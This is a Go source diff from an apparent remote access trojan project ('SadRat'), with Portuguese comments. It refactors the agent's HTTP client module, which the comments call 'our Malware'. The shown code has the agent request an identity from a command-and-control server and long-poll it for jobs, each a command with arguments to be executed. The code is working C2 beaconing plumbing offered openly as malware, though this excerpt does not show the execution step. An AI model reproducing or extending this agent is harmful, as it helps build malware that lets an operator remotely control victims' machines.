@@ -6,7 +6,6 @@ import (
 	"errors"
 	"net/http"
 	"time"
-	"github.com/VitorDie/SadRat/internal/dto" 
 )
 
 // AgentHTTP é o módulo cliente do nosso Malware
@@ -22,6 +21,12 @@ func NewAgentHTTP(serverURL string) *AgentHTTP {
 		// Regra de Ouro: Sempre usar timeout para evitar que o malware trave a thread!
 		httpClient: &http.Client{Timeout: 10 * time.Second},
 	}
+}
+
+type Job struct {
+	ID      string   `json:"id"`
+	Command string   `json:"command"`
+	Args    []string `json:"args"`
 }
 
 // RequestAnUUIDToMe bate na porta do C&C pedindo uma identidade
@@ -64,32 +69,32 @@ func (a *AgentHTTP) RequestAnUUIDToMe() (string, error) {
 }
 
 // RequestJob faz o Long Polling perguntando ao C&C: "Mestre, o que devo fazer?"
-func (a *AgentHTTP) RequestJob(agentID string) (dto.Job, error) {
+func (a *AgentHTTP) RequestJob(agentID string) (Job, error) {
 	// 1. Monta a URL exata do Operador
 	url := a.serverURL + "/api/agents/" + agentID + "/job"
 
 	// 2. Prepara a requisição GET (Long Polling usa GET)
 	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
-		return dto.Job{}, err
+		return Job{}, err
 	}
 
 	// 3. O Agente dispara a requisição e aguarda (pacientemente)
 	resp, err := a.httpClient.Do(req)
 	if err != nil {
-		return dto.Job{}, err
+		return Job{}, err
 	}
 	defer resp.Body.Close()
 
 	// 4. Se o servidor retornou 204 No Content (Sem Comandos), ou algum erro
 	if resp.StatusCode != http.StatusOK {
-		return dto.Job{}, errors.New("nenhum comando recebido ou falha no servidor")
+		return Job{}, errors.New("nenhum comando recebido ou falha no servidor")
 	}
 
 	// 5. O C&C devolveu 200 OK! Vamos ler qual comando devemos executar
-	var job dto.Job
+	var job Job
 	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
-		return dto.Job{}, err
+		return Job{}, err
 	}
 
 	return job, nil
